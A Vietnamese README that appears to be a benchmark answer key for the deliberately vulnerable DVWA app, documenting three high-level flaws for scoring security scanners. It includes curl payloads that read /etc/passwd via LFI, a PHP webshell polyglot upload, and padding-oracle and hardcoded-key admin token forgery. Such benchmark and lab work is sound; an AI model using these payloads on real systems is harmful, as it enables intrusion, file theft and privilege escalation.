# DV-baseline

Tài liệu này (**"DV-Baseline"**) được xây dựng nhằm mục đích thiết lập một **"Ground Truth" (Sự thật nền)** chi tiết, có thể kiểm chứng và định lượng được cho ứng dụng Damn Vulnerable Web Application (DVWA).

Mục tiêu chính là cung cấp một bộ dữ liệu tham chiếu (*benchmark dataset*) chuẩn hóa để đo lường, so sánh và xác thực hiệu suất của các công cụ quét bảo mật ứng dụng động (DAST) và các giải pháp phân tích bảo mật tự động khác.  
Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:

- **Độ phủ (Coverage):** Khả năng phát hiện các lỗ hổng ở các mức độ phức tạp khác nhau (*Low, Medium, High*).

- **Độ chính xác (Accuracy):** Khả năng phân biệt giữa lỗ hổng thực sự (*True Positive*) và các báo động giả (*False Positive*) bằng cách phân tích cấp độ *"Impossible"*.  

- **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.

# Local File Inclusion (LFI) - (OWASP A03:2021 - Injection)
## Method
Phân tích mã nguồn cho thấy một cơ chế `Whitelist (fnmatch("file*", ... ))` đã được triển khai nhưng bị lỗi, cho phép dữ liệu do người dùng kiểm soát đi vào hàm `include()` dẫn tới LFI.

## Vulnerable Code 
### vulnerabilities/fi/source/high.php

```
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { ...
```
Hàm `fnmatch()` với pattern "file*" (bất cứ thứ gì bắt đầu bằng "file"). Nó không chỉ khớp với 'file1.php', mà nó còn khớp với:
-   PHP Wrapper: *'file:///etc/passwd'*
-   Path Traversal: *'file/../../../../../../etc/passwd'*
-   Các file bắt đàu bằng "file*". Ví dụ :"file4.php, file5.php".
## Proof of Value - PoV
### Kịch bản 1: Đọc tệp tin hệ thống qua PHP Wrapper
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file:///etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file:///etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Kịch bản 2: Đọc tệp tin hệ thống qua Path Traversal
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file/../../../../../../etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file/../../../../../../etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Screenshots
- Đọc tệp tin hệ thống qua PHP Wrapper
<img width="2027" height="1291" alt="image" src="https://github.com/user-attachments/assets/05e2c76f-822b-4a9b-883e-c03d1673de11" />

- Đọc tệp tin hệ thống qua Path Traversal
<img width="2029" height="1338" alt="image" src="https://github.com/user-attachments/assets/026e60e3-6cc3-430e-ad90-a7f6754199c3" />

# Unrestricted File Upload (OWASP A08:2021 - Software and Data Integrity Failures)

## Method
Phân tích chức năng tải lên tại `/vulnerabilities/upload/` cho thấy cơ chế xác thực tệp tin không đầy đủ. Cho phép người dùng upload image `(jpg, jpeg, png)` với **content tuỳ ý**

## Vulnerable Code 
### vulnerabilities/upload/source/high.php
```
 // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {
```
Mặc dù ứng dụng đã sử dụng  `getimagesize()` để xác nhận nó là ảnh và kiểm tra ext trong whitelist `["jpg", "jpeg", "png"]` nhưng lại **không phân tích nội dung bên trong của tệp**.

Điều này cho phép kẻ tấn công tạo ra một tệp *polyglot* — một tệp vừa là `image/jpeg` hợp lệ, vừa chứa mã PHP độc hại — và tải nó lên máy chủ thành công.

---

## Proof of Value (PoV)
Kịch bản này chứng minh rằng một tệp chứa mã PHP có thể được tải lên và lưu trữ trên máy chủ, qua mặt cơ chế kiểm tra tệp ảnh.

### Tải lên tệp Polyglot (JPEG + PHP)
- **Mục tiêu:** Tải lên một tệp webshell đơn giản có đuôi `.jpg`.
- **Ý tưởng:** Tạo một tệp `shell.jpg` là một tệp JPEG hợp lệ nhưng có chèn mã PHP vào dữ liệu EXIF hoặc metadata.

**Baseline JSON (mô tả tệp):**
```json
{
  "filename": "shell.jpg",
  "Content-Type": "image/jpeg",
  "content_summary": "GIF89a; <?php system($_GET['cmd']); ?>"
}
```

**Ví dụ nội dung tệp (khái quát):**
```
[Dữ liệu JPEG hợp lệ] ... <?php system($_GET['cmd']); ?> ... [Dữ liệu JPEG còn lại]
```

**Lệnh Tải lên (cURL):**
```bash
curl -i -X POST 'http://[DVWA_IP]/vulnerabilities/upload/'      -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]'      -F 'MAX_FILE_SIZE=100000'      -F 'uploaded=@shell.jpg;type=image/jpeg'      -F 'Upload=Upload'
```

**Kết quả mong đợi:**
- Response của máy chủ sẽ xác nhận tệp đã được tải lên thành công và có thể tiết lộ đường dẫn lưu trữ, ví dụ:
```
...
<pre>../../hackable/uploads/shell.jpg</pre>
...
```
- Điều này xác nhận rằng tệp `shell.jpg` (chứa mã PHP) hiện đang được lưu trữ trên hệ thống.

---

## Screenshots

- Tạo file polyglot đơn giản với magic header **GIF89a**
  <img width="1348" height="102" alt="image" src="https://github.com/user-attachments/assets/90b9dfd5-1675-4c2d-830e-f38b813e1511" />

- Upload file **shell.jpg** chứa mã độc gọi *webshell*
  <img width="2557" height="1017" alt="image" src="https://github.com/user-attachments/assets/f78bc443-378b-44e9-9776-168947e73427" />
  
- Trigger tới **shell.jpg** bằng lỗ hổng `File Inclusion`
<img width="2557" height="1017" alt="image" src="https://github.com/user-attachments/assets/e8f46328-d5cf-4f22-86b9-fa02f20253fd" />


# Privilege Escalation via Cryptographic Failures (OWASP A02:2021)

## Method
Phân tích chức năng kiểm tra token tại `/vulnerabilities/cryptography/` cho thấy ứng dụng sử dụng chế độ mã hóa AES-CBC không an toàn, dẫn đến hai lỗ hổng nghiêm trọng **Padding Oracle** và **Hardcoded key**,

## Vulnerable Code 
### vulnerabilities/cryptography/source/check_token_high.php
```php
function check_token ($data) {
    // ...
    try {
        $d = decrypt ($ciphertext, $iv); // Thử giải mã
        if (preg_match ("/^userid:(\d+)$/", $d, $matches)) {
            // ...
            $ret = array ( "status" => 200, ... ); // Thành công
        } else {
            $ret = array ( "status" => 527, ... ); // Padding đúng, nội dung sai
        }
    } catch (Exception $exp) {
        // LỖ HỔNG: Phản hồi lỗi cụ thể cho việc giải mã thất bại (Padding sai)
        $ret = array (
                        "status" => 526,
                        "message" => "Unable to decrypt token",
                        "extra" => $exp->getMessage()
                    );
    }
    // ...
    return json_encode ($ret);
}
````
**Padding Oracle:** Ứng dụng trả về các mã trạng thái/thông báo lỗi khác nhau (ví dụ: status `526`) khi quá trình giải mã thất bại do "bad padding" so với các lỗi khác. Sự khác biệt này đóng vai trò là một "Oracle", cho phép giải mã và mã hóa (giả mạo) dữ liệu tùy ý mà không cần biết *private key*.

### vulnerabilities/cryptography/source/token_library_high.php

```php
// Trích đoạn từ: token_library_high.php
define ("KEY", "rainbowclimbinghigh");
define ("ALGO", "aes-128-cbc");
define ("IV", "1234567812345678");

function create_token ($debug = false) {
    $token = "userid:2";
    // ...
    // IV bị tái sử dụng liên tục
    $e = encrypt ($token, IV); 
    // ...
}
```

**Hardcoded Key & IV:** Khóa bí mật (KEY) và Initialization Vector (IV) được định nghĩa cứng (hardcoded) trực tiếp trong mã nguồn. Nếu attacker đọc được mã nguồn (ví dụ đọc qua lỗ hổng LFI), họ có thể bỏ qua hoàn toàn cuộc tấn công Padding Oracle và mã hóa token "admin" một cách trực tiếp.

## Proof of Value (PoV)

Chúng tôi trình bày hai kịch bản tấn công với hai giả định khác nhau. Cả hai đều dẫn đến kết quả cuối cùng là nâng quyền lên "admin".

### Kịch bản 1: Tấn công Black-box (Padding Oracle Attack)

Kịch bản này giả định kẻ tấn công không có quyền truy cập vào mã nguồn. Kẻ tấn công sẽ lợi dụng Lỗ hổng 1 (Padding Oracle) để giả mạo token.

  * **Mục tiêu:** Sử dụng Oracle (lỗi `status: 526`) để đoán và tạo ra một token "admin" hợp lệ.

  * **Giai đoạn 1: Thu thập mẫu Token**
    Lấy một cặp `token` và `iv` hợp lệ từ ứng dụng (ví dụ: của user "Bungle").

      * Token (Base64): `[TOKEN_BASE64_CỦA_USER_BUNGLE]`
      * IV (Base64): `[IV_BASE64_CỦA_USER_BUNGLE]`

  * **Giai đoạn 2: Thực thi Exploit Script**
    Chạy script `padding_oracle.php` để tự động hóa cuộc tấn công dự đoán token của "admin".

    ```bash
    # Lệnh chạy script khai thác
    php padding_oracle.php \
        --url "http://[DVWA_IP]/vulnerabilities/cryptography/source/check_token_high.php" \
        --token "[TOKEN_BASE64_CỦA_USER_BUNGLE]" \
        --iv "[IV_BASE64_CỦA_USER_BUNGLE]"
    ```

  * **Giai đoạn 3: Xác minh Nâng quyền**
    Script sẽ trả về một cặp `token` và `iv` mới đã được giả mạo (ví dụ: `{"token": "...", "iv": "..."}`). Gửi cặp token này lên server:

    ```bash
    # Gửi token/iv đã giả mạo tới endpoint chính
    curl -G 'http://[DVWA_IP]/vulnerabilities/cryptography/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'token=[FORGED_ADMIN_TOKEN]' \
         --data-urlencode 'iv=[FORGED_ADMIN_IV]' \
         --data-urlencode 'Check=Check'
    ```

  * **Kết quả:** Server trả về "Welcome admin" (hoặc thông tin user "Geoffery").

### Kịch bản 2: Tấn công White-box (LFI + Hardcoded Key)

Kịch bản này giả định kẻ tấn công đã sử dụng một lỗ hổng khác (như Local File Inclusion - LFI) để đọc được mã nguồn của `token_library_high.php` và phát hiện ra Lỗ hổng 2 (Hardcoded Key).

  * **Mục tiêu:** Sử dụng `KEY` và `IV` bị lộ để tự mã hóa (encrypt) một token "admin".

  * **Giai đoạn 1: Lấy thông tin nhạy cảm (Giả định)**
    Kẻ tấn công đã đọc `token_library_high.php` và biết được:

      * `KEY`: `rainbowclimbinghigh`
      * `ALGO`: `aes-128-cbc`
      * `IV`: `1234567812345678` (Lưu ý: `IV` này được dùng để *tạo* token, khác với `IV` trả về cho client)

  * **Giai đoạn 2: Tạo Script Giả mạo (Forge Script) và xác minh**:
    Sử dụng script tạo token đơn giản `forge_token.python` để tạo token "admin" và gửi cho server.
    
    Script sẽ trả về:

    ```
    --- Payload cho kịch bản White-box ---
    Forged Token (Base64): [FORGED_ADMIN_TOKEN_BASE64]
    IV (Base64): MTIzNDU2NzgxMjM0NTY3OA== 
    ```

    Sử dụng payload này để gửi request (giống Giai đoạn 3 của Kịch bản 1):

    ```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/cryptography/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'token=[FORGED_ADMIN_TOKEN_BASE64]' \
         --data-urlencode 'iv=MTIzNDU2NzgxMjM0NTY3OA==' \
         --data-urlencode 'Check=Check'
    ```

  * **Kết quả:** Server trả về "Welcome admin". 





